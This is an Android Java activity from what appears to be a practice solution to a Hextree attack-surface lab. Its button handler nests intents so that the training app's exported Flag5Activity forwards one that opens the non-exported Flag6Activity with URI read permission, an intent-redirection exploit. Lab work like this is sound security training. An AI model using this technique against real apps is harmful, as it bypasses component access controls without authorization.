package com.example.practicapp;

import static android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    private int counting = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        b1.setOnClickListener(v -> {
            // Setting the action required by the target
            // This intent is called within the intent of Flag5Activity, so it can be used to call non-exported Flag6Activity
            Intent deepIntent = new Intent();
            deepIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag6Activity"
            );
            deepIntent.setFlags(FLAG_GRANT_READ_URI_PERMISSION);
            deepIntent.putExtra("reason", "next");

            // 2️⃣ Inner Intent (contains return + nextIntent)
            Intent innerIntent = new Intent();
            innerIntent.putExtra("return", 42);
            innerIntent.putExtra("nextIntent", deepIntent);

            // 3️⃣ Outer Intent (target Flag5Activity)
            Intent outerIntent = new Intent();
            outerIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag5Activity"
            );

            outerIntent.putExtra("android.intent.extra.INTENT", innerIntent);

            startActivity(outerIntent);
        });
    }

}
